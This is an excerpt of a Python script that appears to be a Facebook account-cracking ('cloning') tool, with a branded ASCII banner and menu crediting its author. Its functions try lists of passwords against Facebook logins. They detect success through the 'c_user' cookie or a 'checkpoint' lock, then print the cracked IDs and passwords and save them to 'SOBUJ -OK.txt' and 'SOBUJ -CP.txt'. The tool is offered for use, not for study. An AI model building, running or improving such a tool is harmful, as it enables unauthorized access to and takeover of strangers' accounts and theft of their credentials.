...
logo=("""\035[1;97m
   ...
   \x1b[1;97m  ███████║╚██████╔╝██████╔╝╚██████╔╝╚█████╔╝
     ╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝  ╚════╝ 
\35[1;33m----------------------------------------------
→   Owner      :  Md.Sobuj Hasan 
→   Facebook   :  Md.Sobuj Hasan 
→   Github     :  sobujhacker
...
def menu():
			...
			if sobuj in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/SOBUJ .OFFICIAL.ACCOUNT');menu()
			elif sobuj in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mSOBUJ \033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[SOBUJ -OK] '+ids+' | '+pas+'\033[1;32m')
				...
				if 'y' in pcp:
					...
					print('\33[1;31m[SOBUJ -CP] '+ids+' | '+pas+'\33[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[SOBUJ -CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/SOBUJ -CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[SOBUJ -OK] '+cid+' | '+ps+'\033[1;32m')
				open('SOBUJ -OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[SOBUJ -CP] '+cid+' | '+ps+'\33[0;97m')
				open('SOBUJ -CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
